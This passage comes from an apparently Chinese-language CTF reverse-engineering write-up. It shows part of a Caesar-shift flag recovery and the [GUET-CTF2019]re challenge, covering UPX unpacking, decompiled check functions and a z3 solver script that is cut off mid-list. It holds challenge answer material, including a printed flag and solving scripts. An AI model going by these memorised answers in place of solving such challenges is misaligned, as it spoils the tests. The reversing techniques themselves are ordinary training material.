        <span class="token keyword">if</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span>isupper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            x <span class="token operator">=</span> <span class="token punctuation">(</span>x <span class="token operator">-</span> <span class="token number">51</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">65</span>
        <span class="token keyword">if</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span>islower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            x <span class="token operator">=</span> <span class="token punctuation">(</span>x <span class="token operator">-</span> <span class="token number">79</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">97</span>
        <span class="token keyword">if</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">==</span> v12<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">:</span>
            flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'flag&#123;'</span> <span class="token operator">+</span> flag <span class="token operator">+</span> <span class="token string">'&#125;'</span><span class="token punctuation">)</span>
<span class="token comment"># flag&#123;Cae3ar_th4_Gre@t&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>上面的这里</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">15</span> <span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">64</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">90</span> <span class="token punctuation">)</span>
        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">51</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">65</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">96</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">122</span> <span class="token punctuation">)</span>
        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">79</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">97</span><span class="token punctuation">;</span>
    <span class="token operator">++</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里的第一个if判断的是大写字母，第二个判断的是是否是小写字母。所以才有了我们的解题的flag。</p>
<p>这里我们把<code>*((char *)v1 + *(_DWORD *)&amp;v12[17])</code>这个整体看作<code>ord(j)</code>了，在逆向中，我们也常常这样将一个整体当成一个变量对待。</p>
<h3 id="GUET-CTF2019-re"><a href="#GUET-CTF2019-re" class="headerlink" title="[GUET-CTF2019]re"></a>[GUET-CTF2019]re</h3><p><strong>TAG:Z3脚本、UPX脱壳</strong></p>
<p>先拖进IDA64里面什么都没有发现，搜索一下字符串发现还是啥都没有，使用前几天刚更新的exeinfo2021查一下壳。</p>
<p><img src="/2021/05/28/CTF/image-20210607132422766.png" alt></p>
<pre class="line-numbers language-none"><code class="language-none">.\upx.exe -d .\attachment\re<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>直接使用上方的命令脱一下壳。</p>
<p><img src="/2021/05/28/CTF/image-20210607132642504.png" alt></p>
<p>对上方的关键的字符串进行一下跟踪，追到下面的函数</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">
__int64 __fastcall <span class="token function">sub_400E28</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">int</span> a2<span class="token punctuation">,</span> <span class="token keyword">int</span> a3<span class="token punctuation">,</span> <span class="token keyword">int</span> a4<span class="token punctuation">,</span> <span class="token keyword">int</span> a5<span class="token punctuation">,</span> <span class="token keyword">int</span> a6<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// edx</span>
  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment">// ecx</span>
  <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment">// er8</span>
  <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment">// er9</span>
  __int64 result<span class="token punctuation">;</span> <span class="token comment">// rax</span>
  __int64 v11<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-30h] BYREF</span>
  <span class="token keyword">unsigned</span> __int64 v12<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-8h]</span>

  v12 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sub_40F950</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token string">"input your flag:"</span><span class="token punctuation">,</span> a2<span class="token punctuation">,</span> a3<span class="token punctuation">,</span> a4<span class="token punctuation">,</span> a5<span class="token punctuation">,</span> a6<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sub_40FA80</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token string">"%s"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v11<span class="token punctuation">,</span> v6<span class="token punctuation">,</span> v7<span class="token punctuation">,</span> v8<span class="token punctuation">,</span> v9<span class="token punctuation">,</span> v11<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">sub_4009AE</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v11<span class="token punctuation">)</span> <span class="token punctuation">)</span>
    <span class="token function">sub_410350</span><span class="token punctuation">(</span><span class="token string">"Correct!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">else</span>
    <span class="token function">sub_410350</span><span class="token punctuation">(</span><span class="token string">"Wrong!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  result <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">!=</span> v12 <span class="token punctuation">)</span>
    <span class="token function">sub_443550</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>再追踪一下<code>sub_4009AE</code>这个函数，发现里面的C代码如下</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">_BOOL8 __fastcall <span class="token function">sub_4009AE</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>a1<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">1629056</span> <span class="token operator">*</span> <span class="token operator">*</span>a1 <span class="token operator">!=</span> <span class="token number">166163712</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">6771600</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">731332800</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">3682944</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">357245568</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">10431000</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">1074393000</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">3977328</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">489211344</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">5138336</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">518971936</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">7532250</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">406741500</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">5551632</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">294236496</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">3409728</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">177305856</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">13013670</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">650683500</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">6088797</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">298351053</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">7884663</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">386348487</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">8944053</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">438258597</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">5198490</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">249527520</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">4544518</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">445362764</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">3645600</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">174988800</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">10115280</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">981182160</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">9667504</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">493042704</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">5364450</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">257493600</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">13464540</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">767478780</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">5488432</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">312840624</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">14479500</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">1404511500</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">6451830</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">316139670</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">6252576</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">619005024</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">7763364</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">372641472</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">7327320</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">373693320</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">8741520</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">498266640</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">8871876</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">452465676</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">4086720</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">208422720</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">9374400</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">515592000</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">5759124</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">719890500</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>变成数学问题了，变成数学问题就简单的多了。</p>
<p>看起来应该是<code>a1</code>这个字符数组里面的内容就是我们要找的flag了，并且长度也是32位，符合一般的flag的32位的md5的特征，所以直接解一下方程即可，编写<code>z3-solver</code>脚本如下(注意要先下载<code>z3-solver</code>库)。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> z3 <span class="token keyword">import</span> <span class="token operator">*</span>
s <span class="token operator">=</span> Solver<span class="token punctuation">(</span><span class="token punctuation">)</span>
a1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    a1<span class="token punctuation">.</span>append<span class="token punctuation">(</span>Int<span class="token punctuation">(</span><span class="token string">'a1['</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">']'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># z3声名整数型的符号变量</span>
<span class="token comment"># add为添加至z3约束求解器中的内容</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">1629056</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">166163712</span> <span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">6771600</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">731332800</span> <span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">3682944</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">357245568</span> <span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">10431000</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1074393000</span> <span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">3977328</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">489211344</span> <span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">5138336</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">518971936</span> <span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">7532250</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">406741500</span> <span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">5551632</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">294236496</span> <span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">3409728</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">177305856</span> <span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">13013670</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">650683500</span> <span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">6088797</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">298351053</span> <span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">7884663</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">386348487</span> <span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">8944053</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">438258597</span> <span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">5198490</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">249527520</span> <span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">4544518</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">445362764</span> <span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">10115280</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">981182160</span> <span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">3645600</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">174988800</span> <span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">9667504</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">493042704</span> <span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">5364450</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">257493600</span> <span class="token punctuation">)</span>
